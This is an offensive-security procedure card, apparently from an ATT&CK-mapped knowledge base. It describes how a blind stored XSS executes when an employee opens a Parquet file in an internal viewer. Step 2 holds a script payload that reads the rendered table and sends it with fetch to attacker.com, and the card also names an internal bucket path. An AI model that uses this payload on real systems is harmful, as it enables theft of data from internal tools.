---
tags:
  - xss
  - execution
  - data-exfiltration
  - parquet
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
  - GCP
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: 2a242480-d53c-4a06-b1ce-436b51252544
created_at: '2025-12-13T23:55:06.116Z'
updated_at: '2025-12-13T23:55:06.116Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-in-Parquet-Viewer

## Summary

This procedure describes the execution phase of the blind stored XSS, where the payload renders and runs JavaScript in the employee's local Parquet Viewer, disclosing limited data.

## Description

Once stored, the payload is rendered when an employee loads a specific Parquet file (e.g., from gs://starscream-adhoc/user/███/shop_dimension/part-00039-4039dc30-6a7a-4108-838d-fb1daec9a216-c000.snappy.parquet) in the internal tool (parquet-viewer-6296239398097329598.html) via a local file path (file://localhost/...). The tool unsafely parses Parquet data into HTML, executing the script in the browser context. This leads to low-impact disclosure of ~20 rows from the affected table, such as shop dimension data, without further access.

## Requirements

1. Payload already stored in a Parquet file accessible via GCS
2. Employee access to the internal Parquet Viewer tool
3. Attacker monitoring for exfiltration callbacks

## Defense

Defensive measures and detection strategies:

- Validate and escape Parquet data before HTML insertion
- Use sandboxed iframes or Web Workers for file rendering
- Log and alert on unexpected network requests from internal tools

## Objectives

1. Execute JavaScript in the internal tool's context
2. Collect and exfiltrate sample data rows
3. Confirm payload success via out-of-band detection

## Instructions

### Step 1: Await File Viewing

**Context**: The trigger occurs passively when an employee opens the affected Parquet file in the viewer.

No action from attacker; the local HTML file loads the GCS URI and renders unsanitized content.

> Expected: Automatic payload execution on file open.

### Step 2: JavaScript Execution

**Context**: The script runs, accessing local DOM elements (e.g., displaying employee name) and sending data externally.

The payload, e.g., `<script>var data = document.querySelector('table').innerHTML; fetch('https://attacker.com/log?data=' + encodeURIComponent(data));</script>`, captures rendered table data (~20 rows).

> Expected: Data sent to attacker, limited to visible sample rows.

### Step 3: Verify Exfiltration

**Context**: Confirm success through received data.

Monitor server logs for incoming requests with table data.

> Expected: Partial table contents, e.g., shop dimension rows.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Execution]]
- [[data-exfiltration]]
